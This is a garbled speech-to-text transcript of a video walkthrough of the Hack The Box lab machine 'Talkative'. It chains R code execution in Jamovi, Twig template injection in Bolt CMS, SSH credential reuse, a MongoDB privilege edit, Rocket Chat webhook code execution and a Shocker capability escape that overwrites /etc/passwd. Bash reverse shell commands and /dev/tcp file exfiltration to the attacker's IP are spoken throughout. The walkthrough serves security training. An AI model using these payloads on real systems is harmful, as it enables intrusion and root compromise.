 what's going on youtube this is ipsec we don't talk in it from hack the box which the hard thing about this box was the enumeration all the exploits weren't really that tough they were pretty simple but they were just getting the pieces to a puzzle and putting the puzzle together tying all the exploits together is what made this extremely challenging once you end map the box you find like four or five different websites which are each docker containers the first one to exploit is an online document editor called movie you get access to that by putting a formula in that allows code execution download a document off of your movie that has credentials and you can use that to log into the bolt cms and get a shell there which is another document container but this one's different it's on a docker network that can talk to the host over ssh so you can use credentials from jumovie to get into the host now the hardest part is going from the host back down to a different docker container because it has a capability so you access a mongodb instance you can edit the user to be at admin then log into rocketchat create a web hook get code execution there abuse the docker capability and get root so with that being said let's jump in as always i'm going to start off with the nmap so dash sc for default scripts sv enumerate versions o a output all formats put in the nmap directory and call it talkative and then the ip address of 1010 11.155. this can take some time to run so i've already ran it looking at the results we have just five ports open the first one being ssh and actually this is filtered it's not open so it just means this port is behaving differently than the other closed ports on the box which likely means there's a firewall here dropping the packets the first open port is http on port 80. it's running an apache web server which the header tells us it's a debian box and it directs us over to talkative.hdb so let's just add this over to our host file so sudo vi etsy host and we can go 10 10 11 155 talkative hdb and the next three web servers is tornado hdpd 5.0 which is just a python web server um there are uh there are some odd things about this like the port 8080 the title for this one is the movie and on 8082 um maybe it's giving us a ip address i don't know if this is to all the web servers or 172 1702 but um yeah so let's just go over to talkative.hdb so if we go 10 10 11 155 it's going to direct us to talkative.hdb and we get a page the first thing i always like doing is a control u and looking at the source just to see if there's like a wp-admin or something that would leak whatever content management system is using we do see content equals bolt which is bolt cms one of the default places of the bolt website is slash bolt and i just realized i said bolt like three times but doing this we get to a login panel so that's going to be the login panel to this cms and scrolling let's see there is an about page if we click on about it gives us their team saul goodman matt williams and janet smith which are just three names if we go down we see the same three things um these names could potentially be used in a brute force attack or just looking up information osnt and then keeps going down we see products there are three talk of stats talk zone and talk for biz and if we go back to the tornado web servers it kind of makes sense that those apps could have been these things if we look at 8080 there's gym movie and talk of stats does talk about their partnership with jamovi this one is talking about rocket chat and then we just have talk zone which seems like it's a chat room unique chat portals rocket chats also a chat um i want to say port 3000 is a default one for um rocket zone but let's just run a full nmap so sudo and map dash p-101011 155 dash oa we'll put it in talkative or nmap and call it all ports and then add the dash v so it shows us open ports as we find them but if we hover over action it goes to about us and it says ready get started and gives us a link over to the rocket chat application i believe this had hovered is a hard link to click or a button i'm going to refresh the page and go back to it oh i saw it right here and it directs us over to port 3000 which is rocket chat um i'm assuming it's like a default for whatever language this is because i want to say mattermost is also defaulted to port 3000 maybe it's let's see what is rocketchat coded in rocketchat github is it nude uh let's see rocket chat typescript so it's a javascript thing but um i think ruby may listen on port 3000 by default anyways but that's enough enumerating of um these websites we just really know there's two different places we can log in i guess we could try creating a rocket chat account so let's go back to port 3000 and see if it lets us generate accounts so we can register a new account undo ipsec root ipsec dot rocks and we'll put the password of password to try and register a new account and it gets invalid domain so let's just try putting talkative.htb as the domain so talkative.hdb click register a new account uh we'll use the name ipsec and it looks like we're in there matamir server or rocketchat i get all these chat applications mixed up um clicking on directory is going to reveal a channel and we just see us and admin in it go back to the directory look at users and i guess there's two other users rocket.cat and admin and admin is going to be sol goodman who from the about us page was the uh ceo so let's go and take a look at the next port which would be 8080 and the full nmap scan did reveal port 3000 open that we found through a link so let's go talkative.hdb port 8080 we get gymovi if we go to 8081 not found and 8082 we get a not found as well i probably should start like a go buster on both of these ports and trying to enumerate it it looks like an api server but for the sake of the length of the video i'm not going to bother that and run the recon then background so let's go back to movie and i accidentally closed the tab so port 8080 and this is and i kind of recognize the icon it's the our programming language if we go here in the rj editor um it looks like a way to execute code well i knew the logo of r but i don't know um and the syntax so i'm gonna go over to google and we're gonna say like our language system command and see what it says so it looks like it has this command it's just system and then we do the command and if we look the intern indicates whether we want to capture the output of the command so i'm going to set intern to true so if i do system who am i and turn equals true and that says hit ctrl shift enter to run it shows us as root so we can try getting a shell on this and can i make this bigger i can so i'm going to try bash c then bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 like that and the quote and let's listen on port 9001 control shift enter and going back over here we have the shell so let's do python 3 c import pty pty dot spawn bend bash enter and then ctrl z stty raw minus echo and then fg enter enter and looking at this um actually let's export term equal x term so now we can clear the screen and if we look around at this container um i know it's a container just based upon the hirscene this b06 we also see a docker env file if we cat it we don't get anything um if we go into the home directory we do have this omv file that's boat administration and this is likely going to be the documents from the movie instance because we got a shell on this and omv is i think a file extension for jemovi um if we do a file against it it's a zip archive so let's send it over to our web server so i'm going to do nclvmp 9001 and direct it to we'll call it bolt administration dot omv and then if we do we have nc on the box we don't um i wonder if i can just cat bolt administration to dev tcp 10 10 14 8 9 000 1. looks like i can if i file bolt administration here we get a zip archive and if we md5 sum them uh let's make sure they're the same looks like they are so we can transfer files that way i'm going to make a directory called bolt admin and we'll unzip it from this directory i'm always hesitant when i run unzip commands because of the chance that they um [Music] hold on a second bolt admin unzip i'm kind of curious why i didn't auto complete this name but um i don't like when zips do this and extract into the current working directory because this would have clobbered the directory i was in so i always create a directory before unzipping so if we look around at this there is data.bin so if we do a strings against it looks empty lsla data.bin um let's see 48 so there is data but it's just pretty much non-printable characters so there is index.html if we look at it it's looking like it's talking about the our language uh i'm an http page if we go to xdata.json we have some data here and it looks like we have potential passwords so i'm going to pipe this over to jq just because it makes it a bit easier to read and i guess we have three users matt janet and saul and three passwords so i'm guessing um was it matt is the first user yeah matt's password is going to be this so we can try logging in um actually uh saul would be the first one we should try because we know saul has an account on rocketchat so we can try logging into rocket chat sol he is admin here so how do i log out of rocket chat maybe click my name log out and we know sol is here so if we do admin and put this in we get login failure we could try each password but i know that's not going to work i'm going to go to this one and this is matt so let's try matt over on this bolt site so if i do matte and put in the password we don't get anything if i try matt at talkative.hdb do the same thing doesn't work if we try admin and login we get access into bolt i'm guessing this login is taking much longer did to deny me so either i'm blocked or it worked and it's just taking a long time to generate the session [Music] i'm going to open another thing to this page because it should not take this long um oh there we go so we have now logged in here and if we go over to configuration main configuration we can look at the configuration file we could also go over to file management and view and edit templates and this is going to allow us to edit the talkative website so if i just go back to talkative.hdb i'm going to do ctrl u to look at the source we can see it's going to theme base2021 so in this i'm going to click on base 2021 and we should be able to edit the website i'm seeing if there's like a create button doesn't look like there is if i go to is there a slash listing here i always hate editing the main website right so i always try to go to um [Music] a lesser used function i don't see it in here um theme.yaml don't know what that's doing let's just click on index.twig and at the bottom of the page i'm going to put test and we'll say hipsec right if we click save changes and go back to talkative we can search for ipsec and we don't see anything um we can also go into the source code just in case for some reason wasn't showing on the website uh if we look at maintenance there is a cache and claim the cache is going to um clear all the pre-compiled yemo files so that's going to be what lets us edit the website i believe so refreshing this if i search for ipsec we see test ipsec right here so we definitely have a way to [Music] edit code on the site i'm just looking for where i was oh to clear the cache page there we go so if we put a reverse shell here um it would execute and this is twig which is a templating language very much like um j2 or two that's the one you're probably most familiar with but i'm just going to google payload all the things twig and find a payload from here so if we go here look at twig and we see code execution and i'm just going to copy one of these it looks like this is probably going to be the easiest one to do i was avoiding this because it's like using special characters for white space i don't know if we can't use spaces there so that's why i'm choosing this payload um let's go to talkative see we don't want the source i'm just going to close these tabs so i stopped getting confused i'm going to put this here and let's just go for a shell right off the bat so bash dash c and i'm going to change these quotes um no real reason i don't know if it would work with or without it but um i just always use this one type of quote for my reverse shell zero and one and the reason why i do that is i try to change as little as possible from these commands if they failed it would take a long time to troubleshoot um i'm not positive putting double quotes around this if i'd have to do any escaping around like these special characters so that's why i just stick to what i know works and we save that we should listen on a port and since i have a reverse shell on this window i'm going to create a new window to get a different reverse shell so we can label them so just make sure this is copied clear the cache and then i'm going to refresh the main page and see if we get a shell does not look like we do if we go down to the bottom of the page where we had it we see id one so we executed something but we screwed up bash dash c i devtcp101014a i think this shell works um oh there's no system here i don't know how i screwed that up um oh it's putting the command here so i play system oh i'm an idiot let's just use this one and see if we have to have white spaces um and there we go i can copy this command here and what's going on here is this had system and this system was running this command and maybe this is just a way to split up the spaces and you can do it with any of them let's see what happens with this wait was this in quotes cat it was so do double quotes here we can save clear the cache refresh and we get a shell so um yeah let's go and do a trick again python dash c input pty pty dot spawn then bash python3 not found we can do a which python 2 which python and we don't have python installed here another way we can get a tty is script dash q was it devnull bash like this and now we can do sdty raw minus echo fg enter enter and we should have the up arrow um script hq devnet let's see let's exit script script dash queue devno then sh i don't know why up air isn't working um if i ctrl c i'm still in the box so maybe that's just something wrong with how i'm doing the script command but as long as i can control c i'm happy let's see export term is equal to x term can't clear the screen as well um where's my stty command raw minus echo okay well i'm gonna move on it's is it a bash thing ls okay it's because i was in bin sh not been bashed so lspu yep there we go awesome so the first thing i generally do whenever i get on a server is try to get the um database credentials so i can do a database dump and try to get other credentials from that so let's grab dash our eye password and the config directory and we don't really see anything too interesting um i'm going to grip for database and we're saying references to the database being stored in the environment even as both config.yml says database setup is best done in environment variables so if we less bolt config if there's anything else there um database see i'm gonna did i do this stty dash a no my rows and columns are zero so rows 26 columns 105 stty rows 26. carls was it 105 and now when i do my less it should be a better so i'm only seeing database in this um [Music] config file as a comment so i'm going to go back to the bolt directory and i'm going to cat dot env to go to where the environment variable most likely is we can potentially just do an env command and get it that way but since we're spawned in so many processes i'm guessing we've lost it um if icat.env let's grep for data we can see the database url is this sqlite if i did env grip for data it's not there because again um if i do ps ef forest let's see um i'm running in this script and this bash and this bash in this bash so uh i bet if i went back to the web server and did the environ command steps in the reverse shell we'd probably see it but um since it is sqlite there are no credentials to access it it is inver databolt.sqlite another file that would be interesting to us as well is the docker compose file here but i'm guessing this is default for um the system and not necessarily what was used because this one is sending mysql database information in a different docker container and has a password but um the config in this docker compose is not being used i was just showing you that because um it may be useful doing other enumeration on other things so dockerfiles are always good to grab um looking at this we know the database name is bolt.sqlite i don't know what the kernel project directory is so i'm just gonna do a find name and then pipe errors to devnull and we see the kernel project directory is just their working directory so we have a sqlite database here if i do sqlite we don't have any way to um dump it on this box so let's send it back to us um let's listen on nc lvnp 9001 i'll call this bolt.sqlite uh devtcp 14 8 9001 sent and now if i do sequel light um what is it yeah sqlite3 bolt.sql we can do a dot dump and dump everything um looks like this database is quite big what if i do dot schemas or dot schema we can see what the schema would be let's see i'm going to search this for password bold password request bolt underscore user is what we want to dump so if we do a select stir from bolt user if i spelt that correctly maybe we can get the users and potential passwords and doesn't look like sequel light has backslash g like mysql does but they are in argon 2 and i don't think we get anything from cracking these so i'm not going to waste the time and sure trying to crack um things at a bolt but that is just one of the enumeration steps i would generally always do um again in the sake of not having this video be three hours i can't show the full paths for every single possible thing if it doesn't pan out but um another thing we could try doing is looking at hostname dash i to get the ip address of this container and we see it's at 172 17 0 12. now this dot 12 is interesting because i p start at dot 2. the host system is generally not 1. um we know there's at least two doctors because we're in this one we do hostname dash i here we see we're on the 18 network so this is a completely separate network i don't think dot 2 this guy can even talk to the 17. let's do 12 like this uh ping not found do we have ping here no we do not um we'd have to upload nmap or something like that and check actually bolt um let's see ss lntp you can probably look at listening ports uh and we don't have netstat if i cat proc net tcp we can see let's see um any host or 0.0.0 is listening on hex 50. um if we converted 50x to decimal that would be port 80 so we know this guy is listening on port 80. so we could probably do we have curl we don't w get don't um cat dev tcp 172 17 0 12 port 80. we can see no such follower directory i bet if we did that here let's start up a web server and let's cat 10 10 14 8 port 8 000 [Music] uh it doesn't look like we can do it that way actually i want to make sure i'm in bash nope i wonder if [Music] we do a redirector does that work no i could swear there was a way to do this nclvnp 8000 so it connects oh um it's because we're not sending a um command i think and the command being like the get slash http one slash dot uh slash 1.1 or whatever like that would be the command but i can probably get this via exit codes now that i'm thinking so if i run the second command we can see it connected to me and if i echo dollar question mark we get the exit code which is zero that is the success if i do this command again now that i'm not listening we get a one so we do have a way to enumerate ports this way so what i wanted to do is now test this against 172.7 so right off the bat it's taking longer which means it probably isn't resolving this host name so um [Music] this docker network we can see 130 which i'm guessing is the exit code if it can't hit that but 172 17012 is not reachable from 170 to 18. so it's a long way to go with saying this is why i'm going to do the enumeration from this container instead of the previous one if we ssh to 172 1701 which is going to be the host computer which generally means ssh is open additionally if we go back to our nmap if we cat nmap talkative.nmap where 22 was filtered um we assume port 22 is filtered going from the 101014 network to this box so that could be just like on an edge firewall right but now that we're on a docker container we're past that firewall and we're accessing point 22 from a different box so let's do ssh um matt was the first user we have from that jumovie document if we do yes let's go what is it bolt admin then cat x data dot json jq dot we can try this password copy paste it in and we get access denied um every other username has been admin with that password so we can try this here and it doesn't work um there are other users on that site like janet and saul so if we try saw paste the password in and we get on the box so this is how we get user.txt and we have escaped docker now the weird thing's going to be we have to go into docker again to priv-esque because uh the prevasque involves a docker capability which is really tough to enumerate on this host um i can't tell how much time i spent trying to find a priv esque from host to root when i had to go back down again to get information out of a docker container now the thing that came in really handy when doing this box is the psef dash dash force command i'm gonna do less dash capital s if i don't do that um i think the line breaks it gets hard to move like to the left right so if i do less dash capital s i'll go in this panel um everything is going to be on one line so if i connect the right key and keep going over to see um what that is if i just do less does it do that or is it on multi lines yeah so with just less without the dash capital s um we kind of have to click around to read lines so i always like using that and this becomes important because we don't have like docker ps so we can't um like list all the containers running but from the ps command we can see the output of we're not the output but the command line of a lot of these containers so we can see right here it's doing docker proxy so this is exposing like port 8082 to the 172 1802 container on port 41339 and it's also on port 41338 so i don't know exactly what those are but 1802 that is this guy if i cat proc net tcp and we look at one of these ports probably a179 and a17b these are going to be those super high ports that we saw on that command so i'm just going to google um hex to decimal i probably could have done it in python in a quick one-liner but i'm lazy sometimes so if i just convert this four one three three seven so um we're kind of making sense of these ports so it goes seven eight and nine uh we have the 132 1701 again again this is going to be my router it's exposing a bunch more ports like six thousand six thousand one and those did not show up on nmap so that is a bit odd let's see oh because it's not on all host so it's just exposing these ports to the containers right because um when we're on the internet we can't hit or 10 10 14 network we can't hit the 172 17 network so um the other thing is we have this user bin container shim moby and this is going to be what the actual application is so like this one container is running jimmy right here right this is the startup and we can see all the processes in that of us exploiting jimovi with our shell right so there is so we know one of the containers is running mongodb and these are all apache and we saw a bunch of others apache processes when um we're perking out the bolt site and here the reverse shell from that but the key thing is mongodb because that's another database that we haven't had access to so if we google mongodb default port let's do this it is two seven zero one seven so i'm going to do my echo trick so 172 uh dev tcp 172 17 1702 and then not that port 27017 okay and i think we just do that and we see exit code 0 on 172 1702 and on other ports or other host we're getting one so we could have wrote a script to loop over this but i want to show how it works and now we know that mongodb is on this 172.170.2 container it's the very first one but we don't have really a way to dump this if i i think this is like dump is the command i want do i have it on this or i don't have any commands in my host so we'll probably have to install the package on our host so we can talk to this database um where was that shell right here um we do have ssh but we're ssh after we did the um [Music] reverse shell so if i do my like ssh command uh to do this and set up a port forward it's gonna send it to the document container not my host because that's where ssh is running the easiest thing to do here is just download a copy of chisel i always like just going to the github to make sure i get the latest version so we can download chisel if we go to releases and get linux amd 64. okay and now we can move downloads chisel to our directory see cannot stat it okay and let's see do i have a dub dub dub i don't let's make that move chisel to dub dub dub and then gunzip dash d and i'm just gonna make it easier to type by just calling it chisel okay so python3 dash m http server and let's download so curl 10 10 14 8 port 8000 slash chisel dash oh chisel so now that that is downloaded we can set up a chisel server on my host so chmod plus x chisel and now to start chisel so dot slash chisel server we want to do dash dash reverse and let's listen on port 8000 and then sage mod plus x chisel here we can do chisel client 10 10 14 8 port 8000 set up a reverse port the mongodb port uh let's see that was 27017 so let's listen on that port on our host and direct it to 172 1702 on the mongodb port connected and now we're sending all the traffic so the next thing we need is to get shell because we have command not found so if we just google um let's google mongodb shell we have a few downloads here and clicking on mongodb shell debian 154 we have a download package so let's download that then sudo d package dash i uh what was it mongodb that looks good see if it installs and we have sh and it looks like we connected right away and we didn't have to specify the port or anything because or ip address because by default it connects to localhost so remember this is a port forward so this is really connecting to that docker container at 172 1701 the first command i always run when i connect to a database is show databases so we run that command and we have admin config local media well admin i think is going to be the like administrative section of mongodb and we didn't use credentials to access this so i'm not too interested in it meteor is definitely not a standard one so i'm gonna use that database if we do show collections this is gonna be like show tables and we can see this is the rocket chat and there is a user's collection which is a table so we're going to do db this is going to be like the equivalent of a select star from database command and so we do db since we did use meteor before db gets translated to meteor then we want to do users and call find on it and we can see there is how many users rocket cat i'm guessing this is a default user for rocket chat or maybe the creator made it um and his id is zlm and this is the password right then we have sol his id and his password and let's see email root oh this is me root i talked about hdb usernames ipsec rule is user here see where the roles of this saul is admin and rocket cat where is rocky cat's role it's a bot so there are two things we could do we have database access right so we can either set my role to be an admin and log in or we can change saul goodman's password to be our password and then we'd of course update it back right because um actually this is me uh saul goodman's password is up here but we could potentially log in as him if we edit this hash to be ours use our password and then change the hash back to be his i'm going to opt for just changing my user to be admin because that's less intrusive also if like multi-factor authentication or something's enabled for his account he'd be notified right so i'm going to do db.users.update and then we pass it a dictionary file so where my id is equal to and it's going to be this weird thing and i don't think that's in quotes um maybe it is we'll put it in quotes if it was just numeric then i would not have put in quotes um then we want to set roles is equal to admin and then close roles close set close id and then end parentheses unexpected comma let's see db users update id set rolls character 76 i'm just going to try removing um one of these there we go um i had too many brackets um i don't know why they expected a comma there but the answer was mismatched uh this is one and this is one i was not thinking i closed the id here but so um now our user is admin so let's go back to was it talktive.hdb port 3000 and we can log in let's see email or username i think i did ipsec and a password of password and now let's see create new options administration we're an admin on um this rocket chat server and if you just perked around here or did some googling you'd find the integrations and this is a good place for code execution a lot of applications once you get to administrative user do have some dangerous functions that let you take over the server so if we click on new integration then incoming web hook we can create one let's call this please subscribe post a channel or user we'll send it to ipsec users ipsec we'll call it the bot enabled true and then we have to come up with a script so i'm going to google github rocketchat because i want to see um what rocketchat's coded in so if we go to the github we can see it's typescript which is going to be some form of javascript so i'm just going to google node.js execute code or execute system and maybe add rocketchat let's see um let's just do execute system rocket chat or node.js like this shell commands with nodejs the exact function so i know it's like with child process create i believe now you can exec see this is taking entirely too long node.js execute system child process so we can copy this and see if this works is there a better one see node.js payload all the things that's all reverse shells let's just try executing this one so copy this paste the script require chart process it's just doing an ls that should be fine save actually instead of ls let's ping or i'm going to keep it as ls i was going to ping but remember all the other doc containers did not have ping which could make it tough um i guess we could cat to dev tcp 10 10 14 8 9001 and we can do bash dash c this should be a good way to identify and i just want to make sure this does connect to me so let's open a new window 9001 okay so now this script should execute except we don't have a way to trigger this integration generally like incoming web hooks give us a web hook right here and the script went away it's odd save let's nclvnp curl this script success false i wonder if the issue is the script not being saved there do any post as ipsec like that see i would assume this would work if this is a good script but nothing seems to be working i'm going to go copy this again if i click on integrations click on this web hook don't know if that's a good thing a bad thing i don't like the script going away each time but maybe maybe it does um let's see let's google rocket chat admin rce go to this github page and it's giving us a different thing this one is doing process main module require so i think all that does is put it before this actually yeah i think that's all it was doing but let's just copy this whole thing paste and we can do bash dash c bash i def tcp 10 10 14 8 9 000 1 0 and 1 like that so let's save this hit the web hook and we have a root shell and again in yet another docker container this time i'm not going to worry about enumerating the entire database because that's how we got into this application is through the database um we don't have um python so i'm doing the script dash queue to get the interactive shell uh st2y raw minus echo fg and i thought we did something else we called bash there we go so i don't have a good reason to explain why we didn't run this on all the previous dockers other than it was just hindsight bias of me not wanting to waste time showing the same thing every time but in docker land there's something called capabilities that gives the container some extended capability i guess that wasn't that um beneficial that was like a no duh thing right but it's not installed on um this host so we have to install the binaries that enable us to enumerate these capabilities so we can see what the exploitation path is so we can either try to install um cap sh on the docker container we're in or find out how it enumerates what the capabilities are now the way i did it was went over to the lynn p's github and i did this because i know lin pease itself does identify container capabilities i just couldn't run lin p's because i don't have python right so i'm going to look at the container script because i'm assuming uh container capabilities would be from the script and we see it's checking if caps h is a command and since it's not it's going to cat proc self status and grab cat so let's run this command and we can see it's probably in a mask so we have to figure out how to translate this hex into something right so the next thing i did was um went on my host system where i have cap sh installed data h to see if it has any type of like way to input a number and then dash dash decode decodes a hex string to a list of capabilities so we can do cap sh dash dash decode paste it in and we have a list of the capabilities running on that container so the other thing is we can go over to this um hat tricks page about the capabilities and it's saying cap says admin says p trace sys module dac read search and we have cap dac read search here we don't have any of the other ones so what we want to do is see how we can abuse dac read search is it on this page it's not i'm just going to google hack tricks back read search go to the linux capabilities page and this is where it's going to talk about it um i think it was there and that went up here we go and i believe this is some weird race condition right it allows us to bypass file read and directory read and execute permissions the purpose of this is allowing a doc container to read files so if we keep scrolling down they do have an exploit script for this i'm just going to click this copy command and i'm going to do let's go back to this one cdw v shocker dot c and the example it gives is read shadow from host let's see it's probably better shown in a browser with the line breaks right see do we have an example right here so we do soccer the location of the file on the host and the file we want in and it's using etsy shadow i'm not going to do that because i don't have another copy of shadow from this box let's save we can gcc it real quick let's give it a name but i'm going to copy it to this and then we're going to um [Music] explain how we're going to get the file that we want off the box right so let's do we have curl a w get uh which w get nope so let's download it with cat so how are we doing it before cat dev tcp 10 10 14 8 9 000 1 2 shocker nc lvmp 9001 direct shocker to that see dev tcp well that's weird i wonder if bash is like wrapped over the dash let's see c will this work which bash i'm actually not sure why that's not working i swear that's how i did it before i know we did this to test ports so that worked which nc we don't have let's go back to the cat and i'm going to reverse the input so i'm going to cap from that and i'm going to direct it to shocker let's see if this one works that looks promising md5sum shocker md5some shocker so we've copied the file up now the next thing we need to do is get a dummy file right and let's see that's chisel i think we can safely kill chisel now because we want to go on this host and we know what the passwd file is right so we can copy this and then add a new line as root so if i copy we go over to this shell i'm going to say passwd oh we don't have a vi that's stupid um let's do v passive ed here that's the right clipboard and we're going to add a new line for root but we're going to call him root backwards and we're going to put a password here so i think we can do open ssl dash crypt and i'm going to call it please subscribe let's see open ssl crypt passive d password open sl passwd dash crypt there we go um i don't like the truncating thing so let's just try this insert okay so nc lvmp 9001 passwd and let's download that file so this will be passwd if we cat it we can see our new user so i'm going to run dot slash shocker etsy passwd pass wd so this should replace the passwd on the host with our malicious one it says success so let's go back to this shell and i can cat etsy pass wd and we don't see a root there so i don't think that was a success su dash well i don't see tor there t-o-o-r um [Music] does not exist so i don't think that worked it says it did but it doesn't look like it did v test this is a test i can't write that cd dev shm v test this is a test okay so let's do dev shm test and try putting passwd there can't find it envy test to see where do we have right access to i guess we could try temp i also had a voidtemp because of the systemd private temp directories says success in tem cd temp cat test but it did not write so i'm going to let's see v test or echo this a a a test so i wonder if it has to be the same size so it says success but it did not write let's see i'm just going to sh t o or it oh we don't even sho this box um we could exit this shell and see if this works please no access denied so i'm guessing it's how we are um doing the pivot or doing the file edit so let's cat x data dot json jq dot copy this password and get back in here okay okay i found out what i did wrong i still don't know exactly why this next piece is going to work but if we go back to what we're doing with the shocker command so we do etsy passwd does not exist well now the file is going to exist if i cut this it's going to be the passwd file so this is a file read so we could read shadow as well i wonder if the file has to be deleted nope there it is so we could try cracking the root password but i don't believe it's going to crack we could check for things like the ssh key so root ssh id rsa see if we can read that we can't so the next piece i don't know exactly why it works if we use the um cap dac override permission even though we don't have it right so here's the cap sh command um and if we look for override we don't have the capability but this next thing actually works so let's go in www i'm going to call it shocker dash right dot c we'll paste it and then gcc dash o shock go right like that okay then nc lvnp uh let's fake that type or typo before it bites us and see lvnp 9001 shocker right and then we can cat dev tcp 10 10 14 8 9 000 1 2 shocker right okay um i also have the passwd file here right yep so let's upload passwd again because when we're doing the exploit before we accidentally wiped our copy so we have both of those ch mod plus x i still can't type i think it's shocker right is it yeah not that it matters um etsy pass wd pass wd so now if we look at cat etsy pass wd we see our new user if we s u to tor and type the password of i think it was please we are now root talkative and again that works because this passwd file we specified our uid and gid was zero which is the root user so we could cat root.text and that is the box so hope you guys enjoyed it take care and we'll see you all next week